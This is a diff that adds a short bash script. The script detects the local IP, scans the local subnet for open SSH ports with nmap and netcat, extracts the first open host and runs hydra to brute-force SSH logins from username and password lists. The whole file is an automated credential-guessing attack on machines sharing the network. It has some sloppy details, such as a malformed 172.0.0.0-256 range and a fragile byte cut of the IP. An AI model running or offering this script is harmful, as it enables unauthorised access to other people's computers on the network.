@@ -1,0 +1,34 @@
+#!/usr/bin/env bash
+
+      export TERM=xterm-color
+      ip=$(ipconfig getifaddr en0)
+
+sleep 15
+  
+if [[ $ip = 192.* ]]; then
+echo $(nmap -oN /User/X22/nmapResults.txt 192.168.1.1-20 -p 22)
+
+elif [[ $ip = 10.* ]]; then
+echo $(nmap -oN /User/X22/nmapResults.txt 10.0.0.1-20 -p 22)
+
+elif [[ $ip = 172.* ]];
+ then
+echo $(nmap -oN /User/X22/nmapResults.txt 172.0.0.0-256 -p 22)
+
+else 
+
+echo Your Connected To Celluar
+fi
+
+ test=$(for i in {1..13}; 
+do nc -n -z -v -w 1 192.168.1.$i 22; 
+done 2>&1 | grep open)
+
+ hydraIP=$(echo $test | cut -b 1,2,3,4,5,6,7,8,9,10,11)
+
+echo $hydraIP
+
+ echo $(hydra -L /loginCreds -P /passwords $hydraIP ssh)
+
+
+
